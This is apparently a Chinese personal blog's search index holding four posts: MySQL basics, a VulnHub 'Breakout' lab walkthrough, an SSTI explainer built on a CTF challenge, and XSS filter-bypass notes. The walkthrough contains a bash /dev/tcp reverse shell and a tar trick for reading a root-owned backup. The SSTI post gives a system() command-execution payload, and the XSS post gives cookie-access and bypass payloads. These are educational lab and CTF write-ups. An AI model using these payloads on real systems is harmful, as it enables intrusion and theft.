<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mysql数据库笔记--第一章</title>
      <link href="/2023/09/14/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
      <url>/2023/09/14/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是数据库"><a href="#什么是数据库" class="headerlink" title="什么是数据库"></a>什么是数据库</h1><p>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据，我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p><p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><h2 id="1-1数据库的种类"><a href="#1-1数据库的种类" class="headerlink" title="1.1数据库的种类"></a>1.1数据库的种类</h2><p>MySQL、MariaDB（MySQL的代替品）、Percona Server（MySQL的代替品·）、PostgreSQL、Microsoft Access、Google Fusion Tables、SQLite、DB2、FileMaker、Oracle、SQL Server、INFORMIX、Sybase、dBASE、Clipper、FoxPro、foshub</p><h2 id="1-2非关系型数据库（NoSQL）"><a href="#1-2非关系型数据库（NoSQL）" class="headerlink" title="1.2非关系型数据库（NoSQL）"></a>1.2非关系型数据库（NoSQL）</h2><p>redis、MongoDB、<a href="https://blog.csdn.net/wyz0516071128/article/details/80877984">Memcache</a>、HBase、BigTable、Cassandra、CouchDB、Neo4J</p><h2 id="2-1RDBMS-术语"><a href="#2-1RDBMS-术语" class="headerlink" title="2.1RDBMS 术语"></a>2.1RDBMS 术语</h2><p>了解数据库之前先了解在sql中的术语，也就是叫法</p><ul><li><strong>数据库:</strong> 数据库是一些关联表的集合。</li><li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li><li><strong>列:</strong> 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。</li><li><strong>行：</strong>一行（元组，或记录）是一组相关的数据，例如一条用户订阅的数据。</li><li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li><li><strong>外键：</strong>外键用于关联两个表。</li><li><strong>复合键</strong>：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li><li><strong>索引：</strong>使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性</li></ul><p>后面都会有介绍，先可以了解一下！</p><ul><li><strong>表头(header)</strong>: 每一列的名称;</li><li><strong>列(col)</strong>: 具有相同数据类型的数据的集合;</li><li><strong>行(row):</strong> 每一行用来描述某条记录的具体信息;</li><li><strong>值(value):</strong> 行的具体信息, 每个值必须与该列的数据类型相同;</li><li><strong>键(key)</strong>: 键的值在当前列中具有唯一性。</li></ul><h1 id="MYSQL学习之路"><a href="#MYSQL学习之路" class="headerlink" title="MYSQL学习之路"></a>MYSQL学习之路</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MySQL 社区版是全球广受欢迎的开源数据库的免费下载版本。它遵循 GPL 许可协议，由庞大、活跃的开源开发人员社区提供支持。</p><p>简单来讲Mysql是开源的，支持众多的系统，支持众多的语言，如：<code>C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl </code>等。</p><h2 id="windows版本sql环境"><a href="#windows版本sql环境" class="headerlink" title="windows版本sql环境"></a>windows版本sql环境</h2><p>可以前往官网下载对应的版本：<a href="https://www.mysql.com/cn/downloads/">MySQL :: MySQL Downloads</a></p><p>菜鸟教程:<a href="https://www.runoob.com/w3cnote/windows10-mysql-installer.html">Windows10 MYSQL Installer 安装（mysql-installer-community-5.7.19.0.msi） | 菜鸟教程 (runoob.com)</a></p><p>我这里为了方便直接使用<code>phpstudy</code></p><p>PHPstudy官网:<a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p><p>下载完成后直接启动mysql服务就行了</p><p><img src="https://img1.imgtp.com/2023/09/14/BN1i7exu.png"></p><p><strong>将密码修改为</strong><code>123456</code></p><p><img src="https://img1.imgtp.com/2023/09/14/NbfsTFmY.png"></p><h3 id="使用终端登入"><a href="#使用终端登入" class="headerlink" title="使用终端登入"></a>使用终端登入</h3><p><img src="https://img1.imgtp.com/2023/09/14/6Hmx8mzB.png"></p><p>登入成功</p><p><img src="https://img1.imgtp.com/2023/09/14/KJTWeEu5.png"></p><p>本地登入可以直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/OARqHI87.png"></p><p>说明成功了！！</p><h2 id="基本命令使用"><a href="#基本命令使用" class="headerlink" title="基本命令使用"></a>基本命令使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES:</span><br><span class="line">列出 MySQL 数据库管理系统的数据库列表。</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/OARqHI87.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES:</span><br><span class="line">显示指定数据库的所有表，使用该命令前需要使用 use 命令来选择要操作的数据库。</span><br><span class="line">使用此命令需要选择数据库use 库名</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/5J55jyur.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW COLUMNS FROM 数据表:</span><br><span class="line">显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/SVV1XDyC.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW INDEX FROM 数据表:</span><br><span class="line">显示数据表的详细索引信息，包括PRIMARY KEY（主键）。</span><br><span class="line">下面展示的暂时没有索引信息</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/UuQaDUvq.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLE STATUS [FROM db_name] [LIKE &#x27;pattern&#x27;] G:</span><br><span class="line">该命令将输出Mysql数据库管理系统的性能及统计信息。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MYSQL数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库笔记 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout</title>
      <link href="/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/"/>
      <url>/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/</url>
      
        <content type="html"><![CDATA[<h1 id="学习前言"><a href="#学习前言" class="headerlink" title="学习前言"></a>学习前言</h1><p>vulnhub是个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。</p><p>Vulnhub 官网：<a href="https://www.vulnhub.com/">Vulnerable By Design ~ VulnHub</a></p><p>今天用到的靶场Breakout：<a href="https://www.vulnhub.com/entry/empire-breakout,751/">Empire: Breakout ~ VulnHub</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>环境：Linux kali Breakout靶机 浏览器</p><p>知识点：Linux基础</p><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>我们拿到靶机后打开直接看到IP地址了</p><p><img src="https://img1.imgtp.com/2023/09/13/21hDFBXO.png"></p><p>但是如果在真实的环境当中进行内网渗透，我们看不到目标主机怎么办呢</p><p>我们知道，内网一般存在于一个网段或者不同网段，可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sn 192.168.159.0/24 #扫描整个网段里的所有IP地址</span><br></pre></td></tr></table></figure><p>这里我们直接知道IP为：192.168.159.134</p><h4 id="第一步：开始收集它开放的端口"><a href="#第一步：开始收集它开放的端口" class="headerlink" title="第一步：开始收集它开放的端口"></a>第一步：开始收集它开放的端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sV 192.168.159.134</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/RCvVcQN8.png"></p><p>可以看到开放的端口是很多的有:<code>80 139 445 10000 20000 </code></p><p>首先我们先访问一下 <code>80 端口</code>有啥东西</p><p><img src="https://img1.imgtp.com/2023/09/13/w6tu9LXo.png"></p><p> 发现了个Apache的页面，说明了它用的中间件是 Apache2</p><p>发现这个有啥用呢，也没发现什么敏感的信息，正当我准备关闭的时候，按下了F12 发现了个不一样的东西</p><p><img src="https://img1.imgtp.com/2023/09/13/91RPOF1q.png"></p><p> 一窜窜东西还提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted</span><br></pre></td></tr></table></figure><p>翻译过来大概是：不要担心，他很安全</p><p>哪它到底安不安全呢?起初我以为是简单的摩尔斯密码，但我一看，有点不像，因为它多了几个符号杂七杂八的东西，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure><p>然后我试了各种密码都不对，最后我还是通过csdn的一篇文章，看到了原题，才知道这是ook加密</p><p><img src="https://img1.imgtp.com/2023/09/13/084SaDkI.png"></p><p>最后解密过来就是：<code> .2uqPEfj3D&lt;P&#39;a-3</code></p><p>推荐解密工具：<a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a></p><p>这一长串的东西，有点像密码，但我们又不确定，先存着</p><p>然后我们再看看 10000 和 20000 这个端口里面是啥</p><p><img src="https://img1.imgtp.com/2023/09/13/sLBSNXZq.png"></p><p><img src="https://img1.imgtp.com/2023/09/13/s8P3R540.png"></p><p>一个网站是Uermin 一个是 Webmin</p><p>两个网站挺正常的也没啥可以的点。</p><h3 id="二、SMB-泄露"><a href="#二、SMB-泄露" class="headerlink" title="二、SMB 泄露"></a>二、SMB 泄露</h3><p>我们通过端口扫描的时候发现了它开启了<code>SMB服务</code>，文件共享服务</p><p>那么我们是否可以通过一些工具来，扫描这些文件有没有我们想要的内容呢？</p><p><img src="https://img1.imgtp.com/2023/09/13/tX2S0dMu.png"></p><p>我们试试用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.159.134</span><br></pre></td></tr></table></figure><p> Enum4Linux 是很棒的扫描工具，可以扫描发现SMB泄露的文件</p><p>通过扫描我们发现了敏感的东西</p><p><img src="https://img1.imgtp.com/2023/09/13/042Obx2M.png"></p><p> 发现了啥 再\Unix User\ 文件有个用户文件叫做<code>cyber</code></p><p>说明什么，说明了这个可能就是系统的某个账户，那么再结合我们上面的密码，是否可以访问后台了呢，首先刚刚有10000 和 20000 两个网站 一个是web应用的后台 密码应该不能是系统里的用户</p><p>所以我们锁定了Usermin，我们试着登入试试</p><p><img src="https://img1.imgtp.com/2023/09/13/BF1uPfR0.png"></p><p>登入成功，既然是个文件管理系统，那不就好办了，可以知道网站上的所有文件</p><p>我们直接打开终端</p><p> <img src="https://img1.imgtp.com/2023/09/13/WAxzoouL.png"></p><p>通过查看目录，发现了一个<code>user.txt</code>打开它就得到了第一个flag</p><p> <img src="https://img1.imgtp.com/2023/09/13/nDKK4LfU.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cyber@breakout ~]$ ls</span><br><span class="line">tar</span><br><span class="line">user.txt</span><br><span class="line">[cyber@breakout ~]$ cat user.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br><span class="line">[cyber@breakout ~]$</span><br></pre></td></tr></table></figure><h3 id="三、Linux提权"><a href="#三、Linux提权" class="headerlink" title="三、Linux提权"></a>三、Linux提权</h3><p>在我们打开另一个<code> tar</code>文件的时候发现啥权限不够，查看权限的时候发现只有root用户才能操作，我们用户是 cyber 无权操作 但是这个是可执行文件，说明什么？</p><p>权限如何看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r 表示文件可以被读（read）</span><br><span class="line"></span><br><span class="line">w 表示文件可以被写（write）</span><br><span class="line"></span><br><span class="line">x 表示文件可以被执行（如果它是程序的话）</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/YU2H5CQw.png"></p><p> 那么我们如何提权呢？如何拿到<code>root</code>权限呢？<br>我们找到网站目录文件看看有啥好东西</p><p><img src="https://img1.imgtp.com/2023/09/13/dX7ijPV5.png"></p><p> 敏感文件 <code>backups</code> 备份文件，进去看看</p><p><img src="https://img1.imgtp.com/2023/09/13/NJrhCpp0.png"></p><p> 还是没发现什么有用的文件，那是不是隐藏了？</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/Okceg2CQ.png"></p><p>果然有个 <code>old_pass.bak</code></p><p> 我们只有读取的权限，那么我们通过打包再解压的方式</p><p>一定要cd ~ 不然会没有权限访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/tar -cvf oldpass.tar /</span>var<span class="regexp">/backups/</span>.old_pass.bak</span><br><span class="line">tar -xvf oldpass.tar</span><br></pre></td></tr></table></figure><p>最后</p><p><img src="https://img1.imgtp.com/2023/09/13/PiFdT4Gs.png"></p><p>得到密码了</p><p>后面发现直接 su 的话是不能直接登入的</p><p><img src="https://img1.imgtp.com/2023/09/13/LQjAbhm6.png"></p><p>所以就用到强大的kali  用 NC做个反弹shell</p><p>nc -lvvp 999</p><p> 靶机上输入：里面是kali的IP、 999 是监听的端口</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.159.128&#x2F;999 0&gt;&amp;1<br>最后就得到flag了</p><p><img src="https://img1.imgtp.com/2023/09/13/hqXm4wXY.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Vulnhub的这个靶场非常适合新手的朋友，里面包含了 信息收集，密码解密，SMB共享文件泄露</p><p>备份文件泄露，通过泄露的密码进行Linux提权。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> 提权 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是SSTI？</title>
      <link href="/2023/09/13/%E4%BB%80%E4%B9%88%E6%98%AFSSTI%EF%BC%9F/"/>
      <url>/2023/09/13/%E4%BB%80%E4%B9%88%E6%98%AFSSTI%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SSTI："><a href="#什么是SSTI：" class="headerlink" title="什么是SSTI："></a>什么是SSTI：</h1><p>SSTI 就是服务器端模板注入，当前使用的一些框架，比如<code>python</code>的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>当前使用的一些框架，比如<code>python</code>的<code>flask</code>，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><h2 id="PHP中常见的SSTI"><a href="#PHP中常见的SSTI" class="headerlink" title="PHP中常见的SSTI"></a>PHP中常见的SSTI</h2><p><code>php</code>常见的模板：twig，smarty，blade，等等。。</p><h5 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h5><p><code>Twig</code>是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像<code>Mustache</code>和<code>liquid</code></p><h3 id="题目案例-CISCN-2019华东南-Web11"><a href="#题目案例-CISCN-2019华东南-Web11" class="headerlink" title="题目案例[CISCN 2019华东南]Web11"></a>题目案例[CISCN 2019华东南]Web11</h3><p>一看题目我还以为是 XFF 直接抓包试试看、</p><p><img src="https://img1.imgtp.com/2023/09/13/yoRsvAzf.png"></p><p>好像没啥用的样子，这里应该是模板注入可以测试一下</p><p>输入：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">9</span>*<span class="number">9</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/h3UmaEzs.png"></p><p> 回显81，证明有SSTI漏洞，应该是PHP的 SSTI注入</p><p><img src="https://img1.imgtp.com/2023/09/13/xkeIOWw5.png"></p><p>直接用 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(<span class="string">&quot;cat ../../../../../../flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取flag</p><p><img src="https://img1.imgtp.com/2023/09/13/cEhOPMqj.png"></p><p><code>Python</code>当中常见的SSTI<br><code>python</code>常见的模板有：<code>Jinja2</code>，<code>tornado</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如<span class="built_in">int</span>()，<span class="built_in">list</span>()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是<span class="built_in">dir</span>(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　<span class="number">1.</span>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　<span class="number">2.</span>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> SSTI漏洞 </tag>
            
            <tag> python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS各种过滤手段，如何绕过写payload</title>
      <link href="/2023/09/13/XSS%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%86%99payload/"/>
      <url>/2023/09/13/XSS%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%86%99payload/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，意思就是说可以任意执行js代码，包括js的而已代码</p><h2 id="如何进行payload的构造："><a href="#如何进行payload的构造：" class="headerlink" title="如何进行payload的构造："></a>如何进行payload的构造：</h2><p>我们知道xss漏洞不会这么简单的被你发现，通常来说开发者都会对用户输入的东西进行过滤，比如简单的就是 将<code>&lt;script&gt;</code> <code>&lt;ifraname&gt;</code>还有&lt; 等进行过滤，用户输入的时候就可以防止js命令随意的执行，但是我们知道这种方法并不是绝对安全的，我们可以通过其他标签来构造payload，在ctf比赛中非常喜欢考察。</p><h3 id="事件过滤："><a href="#事件过滤：" class="headerlink" title="事件过滤："></a>事件过滤：</h3><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">onbeforeprint</span><br><span class="line">onbeforeunload</span><br><span class="line">onerror</span><br><span class="line">onhaschange</span><br><span class="line">onload</span><br><span class="line">onmessage</span><br><span class="line">onoffline</span><br><span class="line">ononline</span><br><span class="line">onpagehide</span><br><span class="line">onpageshow</span><br><span class="line">onpopstate</span><br></pre></td></tr></table></figure><p>一些常见的fuzz，我们在渗透测试中可以进行输入测试，对它进行fuzz测试</p><p>测试到没有进行过滤的事件，那么我们可以用来构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;点&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="敏感关键词（字符串过滤）"><a href="#敏感关键词（字符串过滤）" class="headerlink" title="敏感关键词（字符串过滤）"></a>敏感关键词（字符串过滤）</h4><p>关键字过滤大部分是针对敏感变量或函数而进行的，如cookie、eval等，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过。</p><h4 id="字符串拼接与混淆"><a href="#字符串拼接与混淆" class="headerlink" title="字符串拼接与混淆"></a>字符串拼接与混淆</h4><p>在Javascript中可以通过调用 数组来执行xss命令，比如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><p>将base64转换为原来的，输出的那么就是 alert 了</p><h2 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞中常见的编码方式</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">HTML</span>进制编码：十进制（<span class="selector-tag">a</span>）、十六进制</span><br><span class="line"></span><br><span class="line">css进制编码： 兼容<span class="selector-tag">HTML</span>中的进制表现形式，十进制、十六进制</span><br><span class="line"></span><br><span class="line">Javascript进制编码：八进制、十六进制、Unicode编、ASCII</span><br><span class="line"></span><br><span class="line">url编码：%<span class="number">61</span>（包含%什么的，我们常在url栏可以看到）</span><br><span class="line"></span><br><span class="line">JSFUCK编码</span><br></pre></td></tr></table></figure><h2 id="过滤“-”"><a href="#过滤“-”" class="headerlink" title="过滤“.”"></a>过滤“.”</h2><p>在Javascript中使用with 可以设置变量的作用域，利用此特征可以对“.”进行过滤</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">with</span>(document)<span class="built_in">alert</span>(cookie);</span><br></pre></td></tr></table></figure><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>在标签可以使用 0x09、0x10、0x12、0x13、0x0a 等代替空格进行过滤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xxx.com/xss.php?text=&lt;img0x09src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h3 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h3><p>svg标签和语句遵循的规则是直接继承xml而不是html，区别在于svg内部的script标签中允许在部分进制或编码后的字符（比如实体编码）</p><p>字符串集编码导致绕过<br>当字符集编码存在问题时常常会导致一些出乎意料的绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
